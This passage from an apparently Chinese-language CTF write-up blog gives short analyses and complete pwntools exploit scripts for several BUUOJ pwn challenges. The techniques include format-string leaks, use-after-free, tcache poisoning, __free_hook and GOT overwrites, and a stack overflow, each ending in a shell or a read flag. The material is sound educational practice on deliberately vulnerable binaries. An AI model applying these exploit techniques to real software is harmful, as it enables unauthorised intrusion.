= <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./gyctf_2020_some_thing_interesting&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">25477</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; Now please tell me what you want to do :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">o_size:<span class="built_in">int</span>, o_content, r_size:<span class="built_in">int</span>, r_content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; O&#x27;s length :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(o_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; O :&quot;</span>)</span><br><span class="line">    p.send(o_content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; RE&#x27;s length :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(r_size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; RE :&quot;</span>)</span><br><span class="line">    p.send(r_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, o_content, r_content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; O :&quot;</span>)</span><br><span class="line">    p.send(o_content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; RE :&quot;</span>)</span><br><span class="line">    p.send(r_content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; Oreo ID :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; Oreo ID :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.sendline(<span class="string">b&quot;OreOOrereOOreO%17$p&quot;</span>)</span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;OreOOrereOOreO&quot;</span>)</span><br><span class="line">    __libc_start_main = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">    libc_base = __libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>))</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>, <span class="number">0x60</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; O&#x27;s length :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x60</span>).encode())</span><br><span class="line">    p.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x13</span> + p64(libc_base + <span class="number">0xf1147</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt; RE&#x27;s length :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/11/1GeNDRqhxuXKs9b.png" alt="image.png"></p>
<h2 id="0x067-ciscn-2019-en-3-fmtstr-Use-After-Free-tcache-poisoning"><a href="#0x067-ciscn-2019-en-3-fmtstr-Use-After-Free-tcache-poisoning" class="headerlink" title="0x067.ciscn_2019_en_3 - fmtstr + Use After Free + tcache poisoning"></a>0x067.ciscn_2019_en_3 - fmtstr + Use After Free + tcache poisoning</h2><p>惯例的 <code>checksec</code>，保护全开</p>
<p><img src="https://i.loli.net/2021/05/11/JXhWjCHkByE31rc.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>直接就有一个格式化字符串漏洞，可以用来漏 libc 基址</p>
<p><img src="https://i.loli.net/2021/05/11/c2LP6F15QUGKOAm.png" alt="image.png"></p>
<p>只有分配和释放的功能，但是直接就有一个 UAF ，那就直接改 free hook 为 system</p>
<p><img src="https://i.loli.net/2021/05/11/7F6KH4WGI2Lfuts.png" alt="image.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./ciscn_2019_en_3&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29112</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Input your choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input the size of story: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;please inpute the story: &quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input the index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.sendline(<span class="string">b&quot;%p%p%p%p%p%p%p%p%p%p%p%p%p%p&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;114514&#x27;</span>)</span><br><span class="line">    s = p.recvuntil(<span class="string">b&quot;0x7025702570257025&quot;</span>)[-<span class="number">32</span>:]</span><br><span class="line">    libc_leak = <span class="built_in">int</span>(s[:<span class="number">14</span>], <span class="number">16</span>)</span><br><span class="line">    libc_base = (libc_leak - libc.sym[<span class="string">&#x27;setbuffer&#x27;</span>]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/11/6AF5pzPMXTVZgsW.png" alt="image.png"></p>
<h2 id="0x068-picoctf-2018-buffer-overflow-0-ret2text"><a href="#0x068-picoctf-2018-buffer-overflow-0-ret2text" class="headerlink" title="0x068.picoctf_2018_buffer overflow 0 - ret2text"></a>0x068.picoctf_2018_buffer overflow 0 - ret2text</h2><p>大概是让我们连一个服务器，上边的 <code>vuln</code> 程序是带有漏洞的 SUID 程序</p>
<p><img src="https://i.loli.net/2021/05/11/huBEnOyATvwlPJa.png" alt="image.png"></p>
<p>漏洞比较明显，拷贝的时候存在栈溢出</p>
<p><img src="https://i.loli.net/2021/05/11/mSujzkxf4WI6eEy.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/05/11/ZVc32L98UjFOQY1.png" alt="image.png"></p>
<p>有一个拿flag的函数，返回到这里即可</p>
<p><img src="https://i.loli.net/2021/05/11/nesRubvEjJGxahO.png" alt="image.png"></p>
<p>exp如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaa+\x86\x04\x08</span></span><br></pre></td></tr></table></figure>

<p>运行即可获得 flag</p>
<p><img src="https://i.loli.net/2021/05/11/Ar7pNCcubMWVtEg.png" alt="image.png"></p>
<h2 id="0x069-bjdctf-2020-YDSneedGrirlfriend-Use-After-Free-heap-arrangement"><a href="#0x069-bjdctf-2020-YDSneedGrirlfriend-Use-After-Free-heap-arrangement" class="headerlink" title="0x069.bjdctf_2020_YDSneedGrirlfriend - Use After Free + heap arrangement"></a>0x069.bjdctf_2020_YDSneedGrirlfriend - Use After Free + heap arrangement</h2><p>惯例的 <code>checksec</code>，只开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/07/21/lAnG7YvbVOseIdH.png" alt="image.png"></p>
<p>拖入 IDA 进行分析，大概是提供了分配、释放、打印的功能</p>
<p>其中 girlfriend 结构体为 0x10 的 chunk，结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">void</span> (* print_func)(<span class="type">char</span>*);</span><br><span class="line">    <span class="type">char</span> * name;</span><br><span class="line">&#125;girlfriend;</span><br></pre></td></tr></table></figure>

<p>即一次分配会分配两个 chunk，一个 malloc(0x10)，一个malloc(size)</p>
<p>漏洞点主要在于释放函数中未将指针置0，<strong>存在 UAF 漏洞</strong></p>
<p><img src="https://i.loli.net/2021/07/21/RB5kciVsyJnXg9t.png" alt="image.png"></p>
<p>有个后面函数，那就简单堆风水一下改函数指针为后门函数即可</p>
<p><img src="https://i.loli.net/2021/07/21/KJDxWpXdu2Nlcnt.png" alt="image.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./bjdctf_2020_YDSneedGrirlfriend&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25890</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Her name size is :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Her name is :&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x30</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0x400B9C</span>)) <span class="comment"># idx 2</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/07/21/8zTKsoxvmAY6U5X.png" alt="image.png"></p>
<h2 id="0x06A-wustctf2020-name-your-dog-write-out-of-bound"><a href="#0x06A-wustctf2020-name-your-dog-write-out-of-bound" class="headerlink" title="0x06A.wustctf2020_name_your_dog - write out of bound"></a>0x06A.wustctf2020_name_your_dog - write out of bound</h2><p>和前面的 0x061 基本上一样，不同的是这一次溢出的地方在 bss 段上</p>
<p><img src="https://i.loli.net/2021/05/11/uClUxqFIW92pXHc.png" alt="image.png"></p>
<p>往 got 表写后门函数地址即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26437</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-7&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Give your name plz: &quot;</span>)</span><br><span class="line">p.sendline(p32(<span class="number">0x80485cb</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/11/xkN7g1MEFKQSv6j.png" alt="image.png"></p>
<h2 id="0x06B-judgement-mna-2016-fmtstr"><a href="#0x06B-judgement-mna-2016-fmtstr" class="headerlink" title="0x06B.judgement_mna_2016 - fmtstr"></a>0x06B.judgement_mna_2016 - fmtstr</h2><p>惯例的 <code>checksec</code>，只开了NX和canary</p>
<p><img src="https://i.loli.net/2021/05/11/GiRNK3CowZaez9g.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>有个裸的格式化字符串漏洞</p>
<p><img src="https://i.loli.net/2021/05/11/CDo5JXQmbn1LuAv.png" alt="image.png"></p>
<p>bss段上没法打，有个检测，但是gdb 调一下可以发现flag在栈上有好几个副本，用格式化字符串漏洞读出flag</p>
<p><img src="https://i.loli.net/2021/05/11/TAxMftjoEJQzYn9.png" alt="image.png"></p>
<p>（这格式化字符串藏得还挺深）</p>
<p><img src="https://i.loli.net/2021/05/11/vsUhZnbYCPJAz8a.png" alt="image.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">26563</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%45$s&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可获得flag</p>
<p><img src="https://i.loli.net/2021/05/11/8tb3RoV5LQzaqCg.png" alt="image.png"></p>
<h2 id="0x06C-gyctf-2020-signin-Use-After-Free-tcache-stash"><a href="#0x06C-gyctf-2020-signin-Use-After-Free-tcache-stash" class="headerlink" title="0x06C.gyctf_2020_signin - Use After Free + tcache stash"></a>0x06C.gyctf_2020_signin - Use After Free + tcache stash</h2><p>惯例的 <code>checksec</code>，只开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/05/11/VivgrqaDwzjx25H.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>大概是有着分配、编辑、释放堆块的功能，没有打印</p>
<p><img src="https://i.loli.net/2021/05/11/BtJvcGrPTbm4EYN.png" alt="image.png"></p>
<p>释放的时候只会清除标志位不会清除指针，而编辑时不看标志位，存在 UAF，但是只能编辑一次</p>
<p><img src="https://i.loli.net/2021/05/11/w46lbTcMY8eRnI7.png" alt="image.png"></p>
<p>有个后门，只要能够向 bss 段上某个特殊的地方写入即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/12/x7mJKvf5AiR9sjw.png" alt="image.png"></p>
<p>calloc 不走 tcache，而当 tcache 未满时从 fastbin 中取 chunk ，则 ptmalloc2 会将 fastbin 中剩余 chunk 链入 tcache 链表头部，由此我们可以先填满 tcache，在 fastbin 中放入一个 chunk，随后修改 fastbin 中 chunk 的 fd 为 bss 段上地址，之后再从tcache 中取出一个 chunk，通过 calloc 将 fake bss chunk 链入 tcache 链表头部，成功 get shell</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./gyctf_2020_signin&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">28127</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;your choice?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;idx?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        new(i)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0x4040C0</span> - <span class="number">0x10</span>))</span><br><span class="line">    new(<span class="number">8</span>)</span><br><span class="line">    new(<span class="number">9</span>)</span><br><span class="line">    cmd(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/05/13/XdAqpJIxQEcfe8w.png" alt="image.png"></p>
<h2 id="0x06D-picoctf-2018-are-you-root-heap-trick"><a href="#0x06D-picoctf-2018-are-you-root-heap-trick" class="headerlink" title="0x06D.picoctf_2018_are you root - heap trick"></a>0x06D.picoctf_2018_are you root - heap trick</h2><p>大概是提供了一个登入系统的功能，但是只有 level5 能够读 flag，我们最高只能创建 level 4 的账号</p>
<p><img src="https://i.loli.net/2021/05/11/2onJYDWKFRTr1Vq.png" alt="image.png"></p>
<p>漏洞点在于每次登录时会创建一个 chunk 保存账户相关信息，fd 域放一个指针指向保存个人信息的 chunk ——由strtok 创建，而 bk 域储存 level 信息，<strong>且不会被初始化</strong>；在退出时只会 free 掉储存信息的 chunk，由此可以通过再分配的方式使得 level 变为5</p>
<p><img src="https://i.loli.net/2021/05/11/PlaFYHEK3gqmseu.png" alt="image.png"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29565</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;login &quot;</span> + <span class="string">b&#x27;arttnba3&#x27;</span> + p64(<span class="number">5</span>))</span><br><span class="line">p.sendline(<span class="string">b&quot;reset&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;login &quot;</span> + <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;get-flag&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可获得 flag</p>
<p><img src="https://i.loli.net/2021/05/11/sGPuyTUwAjoCYWV.png" alt="image.png"></p>
<h2 id="0x06E-mrctf2020-shellcode-revenge-Alphanumeric-Shellcode"><a href="#0x06E-mrctf2020-shellcode-revenge-Alphanumeric-Shellcode" class="headerlink" title="0x06E.mrctf2020_shellcode_revenge - Alphanumeric Shellcode"></a>0x06E.mrctf2020_shellcode_revenge - Alphanumeric Shellcode</h2><p>大概是读入 shellcode 后执行，但是只能输入可见字符，那就用<a target="_blank" rel="noopener" href="https://github.com/TaQini/alpha3.git">这个轮子</a>生成 alphanumeric shellcode 即可，注意程序用的 read，别把换行符也给输进去了</p>
<p>exp 如下：</p>
